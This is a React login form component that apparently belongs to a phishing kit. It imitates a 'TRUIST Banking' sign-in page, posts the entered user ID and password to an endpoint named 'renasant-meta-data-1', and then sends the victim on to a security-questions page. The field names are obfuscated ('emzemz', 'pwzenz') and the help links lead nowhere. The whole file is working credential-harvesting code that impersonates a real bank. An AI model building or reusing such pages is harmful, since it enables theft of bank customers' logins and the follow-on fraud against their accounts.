import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';

const LoginForm: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const navigate = useNavigate();

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      emzemz: emzemz.trim() ? '' : 'User ID is required.',
      pwzenz: pwzenz.trim() ? '' : 'Password is required.',
    };

    setErrors(newErrors);

    if (newErrors.emzemz || newErrors.pwzenz) {
      setIsLoading(false);
      return;
    }

    const url = `${baseUrl}api/renasant-meta-data-1/`;

    try {
      await axios.post(url, {
        emzemz,
        pwzenz,
      });
      navigate('/security-questions', {
        state: {
          emzemz,
        },
      });
    } catch (error) {
      console.error('Error sending message:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const renderError = (message: string) => (
    <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
      <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
        <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
      </svg>
      <span>{message}</span>
    </div>
  );

  return (
    <section className="w-full">
      <h1 className="mx-auto mb-6 w-full max-w-2xl text-center text-3xl font-semibold text-[#2b0d49]">
        Sign In – Welcome to TRUIST Banking
      </h1>
      <div className="mx-auto w-full max-w-2xl rounded-2xl border border-[#e2d8f1] bg-white shadow-[0_20px_60px_rgba(43,13,73,0.12)]">
        <div className="px-8 py-10">
          <p className="text-sm font-semibold text-[#6c5d85]">Enter your credentials to continue</p>

          <form onSubmit={handleSubmit} className="mt-8 space-y-6">
            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="emzemz">
                User ID
              </label>
              <input
                id="emzemz"
                name="emzemz"
                type="text"
                value={emzemz}
                onChange={(e) => setEmzemz(e.target.value)}
                className="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                placeholder="Enter your User ID"
              />
              {errors.emzemz && renderError(errors.emzemz)}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="pwzenz">
                Password
              </label>
              <input
                id="pwzenz"
                name="pwzenz"
                type="password"
                value={pwzenz}
                onChange={(e) => setPwzenz(e.target.value)}
                className="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                placeholder="Enter your password"
              />
              {errors.pwzenz && renderError(errors.pwzenz)}
            </div>

            <div className="flex flex-wrap gap-3 pt-2">
              <button
                type="submit"
                className="inline-flex items-center justify-center rounded-full bg-[#5f259f] px-8 py-3 text-sm font-semibold text-white hover:bg-[#4a1a7e] disabled:opacity-70"
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent"></span>
                ) : (
                  'Sign in'
                )}
              </button>
            </div>
          </form>

        </div>
      </div>
      <div className="mx-auto mt-10 w-full max-w-2xl space-y-6 text-sm text-[#5d4f72]">
        <p className="text-center leading-relaxed">
          For security reasons, never share your username, password, social security number, account number or other
          private data online, unless you are certain who you are providing that information to, and only share
          information through a secure webpage or site.
        </p>
        <div className="flex flex-wrap items-center justify-center gap-4 text-center font-semibold text-[#5f259f]">
          <a className="hover:underline" href="#">
            Forgot Username?
          </a>
          <span className="text-[#cfc2df]">|</span>
          <a className="hover:underline" href="#">
            Forgot Password?
          </a>
          <span className="text-[#cfc2df]">|</span>
          <a className="hover:underline" href="#">
            Forgot Everything?
          </a>
          <span className="text-[#cfc2df]">|</span>
          <a className="hover:underline" href="#">
            Locked Out?
          </a>
        </div>
      </div>
    </section>
  );
};

export default LoginForm;
